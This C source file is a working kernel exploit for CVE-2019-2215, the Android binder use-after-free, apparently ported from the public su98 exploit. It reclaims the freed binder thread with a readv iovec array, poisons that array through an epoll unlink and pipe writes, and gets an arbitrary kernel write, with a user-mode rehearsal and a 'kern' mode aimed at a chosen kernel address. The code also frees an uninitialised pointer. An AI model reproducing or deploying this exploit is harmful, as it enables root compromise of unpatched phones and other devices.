#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <sched.h>
#include <signal.h>

/* CVE-2019-2215 arbitrary WRITE, ported from public su98.c (3.18.71-perf) to MY
 * measured constants, and staged so the first run cannot corrupt anything.
 *
 * Why this is not my earlier (failed) readv attempt, and what su98 has that
 * broot2/3/4 lacked:
 *   1. In 3.18, readv/writev import the iovec array into the kernel's OWN copy
 *      (kmalloc(sizeof(iovec)*nr) once nr > UIO_FASTIOV) -- and that copy is the
 *      object we reclaim.  The per-segment loop re-reads base/len from the COPY,
 *      so rewriting the copy rewrites where later segments go.
 *   2. EPOLL_CTL_DEL's __list_del writes two qwords at slot+0x50/0x58.  In my
 *      layout (sizeof binder_thread 0x128, wait.lock@0x48, head.next@0x50,
 *      head.prev@0x58) that is exactly entry[5].iov_base / entry[5].iov_len, so
 *      entry[5] becomes {base = the array itself, len = ~2^64} -- the pipe data
 *      for segment 5 lands INSIDE the kernel's array and rewrites segments 6,7.
 *   3. Parking: entry[4].iov_len becomes 0x10001 from the lock, and the pipe is
 *      1 page, so the walk blocks inside segment 4 until the child writes.
 *      The child writes in SEPARATE write() calls so that exactly one chunk
 *      lands per segment (a single big write would let the huge segment-5 length
 *      swallow the whole pipe -- that is what my broot3 "readv returns early"
 *      observation really was).
 *
 * mode "user": segment 6's destination is a user buffer -> proves the rewrite +
 * re-read chain with zero kernel risk.  Only then try "kern".
 */

#define PAGE          0x1000
#define UAF_SPINLOCK  0x10001UL
#define IOVEC_ARRAY_SZ   25
#define LOCK_OFF        0x48
#define HEAD_OFF        0x50
#define WQ              (HEAD_OFF / 16)          /* entry 5 holds head.next/prev */
#define LOCKI           (LOCK_OFF / 16)           /* entry 4: .iov_len is the lock */
#define BINDER_THREAD_EXIT     0x40046208u
#define BINDER_SET_MAX_THREADS 0x40046205u
#define DELAY_USEC        250000

typedef uint64_t binder_size_t;
typedef uint64_t binder_uintptr_t;
struct binder_transaction_data {
    union { uint32_t handle; binder_uintptr_t ptr; } target;
    binder_uintptr_t cookie; uint32_t code; uint32_t flags;
    int32_t sender_pid; uint32_t sender_euid;
    binder_size_t data_size; binder_size_t offsets_size;
    union { struct { binder_uintptr_t buffer; binder_uintptr_t offsets; } ptr; uint8_t buf[8]; } data;
};
struct binder_write_read {
    binder_size_t write_size; binder_size_t write_consumed; binder_uintptr_t write_buffer;
    binder_size_t read_size;  binder_size_t read_consumed;  binder_uintptr_t read_buffer;
};
#define BINDER_WRITE_READ  _IOWR('b', 1, struct binder_write_read)
#define BC_TRANSACTION     _IOW('c', 0, struct binder_transaction_data)

static int epfd, binder_fd;
static unsigned long ktarget;                 /* where mode=kern writes */
static unsigned long testDatum;
static const unsigned long TESTVALUE = 0xABCDDEADBEEF1234UL;

static void onalrm(int sig)
{
    (void)sig;
    printf("  PARENT: ALARM -- readv never returned (writer still open or bad geometry)\n");
    _exit(3);
}

static void cwrite(int fd, const void *p, size_t n, const char *tag)
{
    size_t done = 0;
    while (done < n) {
        ssize_t w = write(fd, (const char *)p + done, n - done);
        if (w < 0) { printf("    CHILD: %s write FAILED errno=%d (%s)\n", tag, errno, strerror(errno)); return; }
        done += (size_t)w;
    }
    printf("    CHILD: %s wrote %zu\n", tag, done);
}

static void pin0(void)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(0, &s);
    sched_setaffinity(0, sizeof s, &s);
}

/* verbatim from tools/broot.c: the only state where binder_poll registers on
 * &thread->wait is "todo empty, transaction_stack non-NULL". */
static int arm_pending_tx(int fd)
{
    char wbuf[4 + sizeof(struct binder_transaction_data)];
    char payload[16];
    struct binder_transaction_data tr;
    struct binder_write_read bwr;
    uint32_t cmd = BC_TRANSACTION;
    int i, rc;

    memset(payload, 0, sizeof payload);
    memset(&tr, 0, sizeof tr);
    tr.target.handle = 0;
    tr.code = 2;
    tr.data_size = sizeof payload;
    tr.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)payload;
    memcpy(wbuf, &cmd, 4);
    memcpy(wbuf + 4, &tr, sizeof tr);
    memset(&bwr, 0, sizeof bwr);
    bwr.write_size = sizeof wbuf;
    bwr.write_buffer = (uintptr_t)wbuf;
    if (ioctl(fd, BINDER_WRITE_READ, &bwr)) return -1;

    for (i = 0; i < 3; i++) {
        char rbuf[256];
        struct binder_write_read bwr2;
        size_t off;
        int got_complete = 0, got_reply = 0;
        memset(rbuf, 0, sizeof rbuf);
        memset(&bwr2, 0, sizeof bwr2);
        bwr2.read_size = sizeof rbuf;
        bwr2.read_buffer = (uintptr_t)rbuf;
        errno = 0;
        rc = ioctl(fd, BINDER_WRITE_READ, &bwr2);
        for (off = 0; off + 4 <= (size_t)bwr2.read_consumed; ) {
            uint32_t c;
            memcpy(&c, rbuf + off, 4);
            off += 4;
            if (c == 0x7206) got_complete = 1;
            else if (c == 0x80407203 || c == 0x80407202) { got_reply = 1; off += 64; }
        }
        if (rc) return rc;
        if (got_complete && !got_reply) return 0;
        if (got_reply) return -1;
    }
    return -1;
}

static uint64_t rd_le64(const char *p) { uint64_t v; memcpy(&v, p, 8); return v; }

int main(int argc, char **argv)
{
    int mode_kern = (argc > 1 && !strcmp(argv[1], "kern"));
    int rounds = argc > 2 ? atoi(argv[2]) : 3;
    int maxth = 3;
    unsigned long dest;

    setvbuf(stdout, NULL, _IONBF, 0);
    ktarget = (argc > 3) ? strtoull(argv[3], NULL, 16) : 0xffffffc00189be74UL;
    dest = mode_kern ? ktarget : (unsigned long)&testDatum;
    if (mode_kern)
        printf("MODE=KERN writing to %#lx -- DANGEROUS\n", ktarget);
    else
        printf("MODE=USER writing to &testDatum=%p -- safe rehearsal\n", &testDatum);

    signal(SIGALRM, onalrm);
    pin0();
    for (int r = 0; r < rounds; r++) {
        struct epoll_event ev = { .events = EPOLLIN };
        struct iovec iov[IOVEC_ARRAY_SZ];
        char *dummy, *f, *bigbuf, *hugebuf;
        /* (chunk/paylen are defined below, next to the pipe setup) */
        int pipes[2], b, total;

        printf("--- round %d ---\n", r);
        testDatum = 0;
        binder_fd = open("/dev/binder", O_RDWR);
        if (binder_fd < 0) { printf("open binder: %s\n", strerror(errno)); return 1; }
        if (epfd <= 0) epfd = epoll_create(16);
        ioctl(binder_fd, BINDER_SET_MAX_THREADS, &maxth);

        if (arm_pending_tx(binder_fd)) {
            printf("  not armed, retry\n");
            close(binder_fd);
            continue;
        }
        if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &ev)) { printf("  add fail\n"); return 1; }

        memset(iov, 0, sizeof iov);
        /* Parking segment [0] is at slot+0x00, which the unlink never touches: the
         * child feeds it 32768 of its 65536 bytes, THEN does EPOLL_CTL_DEL, THEN the
         * rest.  "Half fed" is the proof that the walk is parked inside our array
         * copy, so the poison lands where the walk will re-read it.
         * [4].iov_len = wait.lock -> 0x10001 after the DEL's spin_lock/unlock.
         * [5] = head.next/prev -> {slot+0x50, slot+0x50}: destination is the array
         *     itself, so the next chunk rewrites segments 5..8 in kernel memory.
         * [24] carries a big length ONLY to inflate the total the kernel computes at
         *     import time (iov_length), in case this readv path caps the read at that
         *     total instead of re-reading each segment.  The walk never reaches it. */
        bigbuf  = malloc(0x20000);              /* >= UAF_SPINLOCK, backs [0] and [4] */
        hugebuf = malloc(0x100000);
        memset(bigbuf, 0, 0x20000);
        memset(hugebuf, 0, 0x100000);
        iov[0].iov_base = bigbuf;
        iov[0].iov_len  = 0x10000;
        for (int i = 1; i < IOVEC_ARRAY_SZ - 1; i++) {
            iov[i].iov_base = bigbuf;
            iov[i].iov_len  = 0;
        }
        iov[IOVEC_ARRAY_SZ - 1].iov_base = hugebuf;
        iov[IOVEC_ARRAY_SZ - 1].iov_len  = 0x100000;

        /* The chunk the child pipes into the poisoned segment 5.  Its destination is
         * the array itself, so these 64 bytes become kernel memory: entry5 is a
         * throwaway (the kernel immediately rewrites it as it advances), entry6 is the
         * write target, entry7 is the read-back check. */
        int paylen = mode_kern ? 4 : 64;
        unsigned long chunk[8] = {0};
        chunk[0] = (unsigned long)bigbuf;            /* new [5].iov_base : throwaway */
        chunk[1] = 0;                                /* new [5].iov_len  : skipped */
        chunk[2] = dest;                             /* new [6].iov_base : WRITE HERE */
        chunk[3] = paylen;                           /* new [6].iov_len */
        chunk[4] = (unsigned long)&testDatum;        /* new [7].iov_base : verify slot */
        chunk[5] = 8;                                /* new [7].iov_len */

        if (pipe(pipes)) { perror("pipe"); return 1; }
        if (fcntl(pipes[0], F_SETPIPE_SZ, PAGE) != PAGE) { printf("  pipe sz fail\n"); return 1; }
        if (fcntl(pipes[1], F_SETPIPE_SZ, PAGE) != PAGE) { printf("  pipe sz fail\n"); return 1; }

        total = (int)(0x10000 + 0x10001 + sizeof(chunk) + paylen + 8);
        f = calloc(1, total + 16);
        if (!f) { perror("alloc"); return 1; }

        pid_t kid = fork();
        if (kid < 0) { perror("fork"); return 1; }
        if (kid == 0) {
            prctl(PR_SET_PDEATHSIG, SIGKILL);
            close(pipes[0]);

            pin0();
            usleep(DELAY_USEC);
            cwrite(pipes[1], f, 32768, "half-of-seg0(park proof)");
            usleep(100000);
            printf("  CHILD: EPOLL_CTL_DEL\n");
            epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &ev);
            usleep(100000);
            printf("  CHILD: fill seg[0] (%d bytes)\n", 0x10001);
            cwrite(pipes[1], f, 0x10000 - 32768, "rest-of-seg0");
            usleep(100000);
            cwrite(pipes[1], f, 0x10001, "seg4-lock-len");
            usleep(100000);
            printf("  CHILD: rewrite array (%zu bytes)\n", sizeof(chunk));
            cwrite(pipes[1], chunk, sizeof(chunk), "array-rewrite");
            usleep(120000);
            printf("  CHILD: payload %d bytes -> dest %#lx\n", paylen, dest);
            memset(f, mode_kern ? 0x00 : 0x5A, paylen);
            cwrite(pipes[1], f, paylen, "payload");
            usleep(120000);
            printf("  CHILD: verify 8 bytes\n");
            memcpy(f, &TESTVALUE, 8);
            cwrite(pipes[1], f, 8, "verify8");
            usleep(120000);
            close(pipes[1]);
            _exit(0);
        }
        alarm(6);    /* watchdog */

        ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
        errno = 0;
        b = readv(pipes[0], iov, IOVEC_ARRAY_SZ);
        printf("  PARENT: readv=%d errno=%d (%s)\n", b, errno, b < 0 ? strerror(errno) : "ok");

        {   /* the child may be stalled writing into a pipe nobody drains; don't let
             * it decide how this round ends */
            int st;
            kill(kid, SIGKILL);
            waitpid(kid, &st, 0);
        }
        printf("  PARENT: testDatum=%#lx expected=%#lx  -> %s\n",
               (unsigned long)testDatum, TESTVALUE,
               testDatum == TESTVALUE ? "*** WRITE CHAIN WORKS ***" : "no write");
        if (!mode_kern && testDatum == TESTVALUE)
            printf("  rehearsal passed: rerun as `kern <hexaddr>` to write kernel memory\n");

        close(pipes[0]);
        free(f); free(dummy);
        close(binder_fd);
        if (testDatum == TESTVALUE) return 0;
    }
    return 1;
}
